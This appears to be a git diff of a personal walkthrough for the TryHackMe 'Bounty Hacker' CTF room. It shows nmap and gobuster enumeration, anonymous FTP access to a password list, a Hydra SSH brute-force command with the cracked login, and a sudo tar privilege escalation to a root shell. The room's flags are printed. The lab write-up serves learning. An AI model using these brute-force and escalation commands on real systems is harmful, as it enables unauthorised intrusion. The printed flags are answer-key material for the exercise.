@@ -2,7 +2,7 @@ All steps and concepts about CTF made on https://tryhackme.com/room/cowboyhacker
 
 1 - PortScaning
 
-    nmap -sV 10.10.239.161
+    nmap -sV 10.10.19.198
 
     PORT   STATE SERVICE VERSION
     21/tcp open  ftp     vsftpd 3.0.3
@@ -13,30 +13,92 @@ All steps and concepts about CTF made on https://tryhackme.com/room/cowboyhacker
 
     cd "/usr/share/wordlists/dirbuster"
 
-    gobuster dir -u http://10.10.239.161/ -w directory-list-2.3-small.txt -x php, html, txt
+    gobuster dir -u http://10.10.19.198/ -w directory-list-2.3-small.txt -x php, html, txt
 
 3 - The PortScaning return ftp services is open anonymous, connect it
 
-    ftp anonymous@10.10.239.161 -p 21
+    ftp anonymous@10.10.19.198 -p 21
 
     On base path, there are two file taks.txt and locks.txt
 
 4 - Download of the content task.txt with wget
 
-    wget ftp://anonymous@10.10.239.161/task.txt -p 21
+    wget ftp://anonymous@10.10.19.198/task.txt -p 21
 
     This one contents the answers for first CTF at the end
 
     'lin'
 
-5 - Go on - Try download this one
+5 - Don't need download this locks.txt file, just connect ftp and use less to get content
 
-    wget ftp://anonymous@10.10.239.161/locks.txt -p 21
+    less locks.txt
 
+    rEddrAGON
+    ReDdr4g0nSynd!cat3
+    Dr@gOn$yn9icat3
+    R3DDr46ONSYndIC@Te
+    ReddRA60N
+    R3dDrag0nSynd1c4te
+    dRa6oN5YNDiCATE
+    ReDDR4g0n5ynDIc4te
+    R3Dr4gOn2044
+    RedDr4gonSynd1cat3
+    R3dDRaG0Nsynd1c@T3
+    Synd1c4teDr@g0n
+    reddRAg0N
+    REddRaG0N5yNdIc47e
+    Dra6oN$yndIC@t3
+    4L1mi6H71StHeB357
+    rEDdragOn$ynd1c473
+    DrAgoN5ynD1cATE
+    ReDdrag0n$ynd1cate
+    Dr@gOn$yND1C4Te
+    RedDr@gonSyn9ic47e
+    REd$yNdIc47e
+    dr@goN5YNd1c@73
+    rEDdrAGOnSyNDiCat3
+    r3ddr@g0N
+    ReDSynd1ca7e
 
-10.10.239.161
+6 - Brute Attch force with Hydra
+
+    hydra -l lin -P pass.txt 10.10.19.198 ssh -t 4
+
+    returns:
+
+    [22][ssh] host: 10.10.19.198   login: lin   password: RedDr4gonSynd1cat3
+
+7 - Connect ssh with user lin and password step before
+
+    ssh lin@10.10.19.198
+
+8 - Get content of user.txt that is in root path, it's one flag:
+
+    THM{CR1M3_SyNd1C4T3}
+
+9 - Escalate Privileges 
+
+    First, see what lin user can execute with sudo permission 
+
+    sudo -l
+
+    returns:
+
+    (root) /bin/tar
+
+    So, We can run /bin/tar as root? We can exploit this! I search for tar on https://gtfobins.github.io/ and look for the sudo command:
+
+    sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
+
+10 - Go into /root and get content of root.txt ( last flag ): 
+
+    THM{80UN7Y_h4cK3r}
+
+10.10.19.198
 
 Concepts:
 #PortScaning
 #Gobuster
 #FTP Anonymous
+#Hydra 
+#Escalate Privileges 
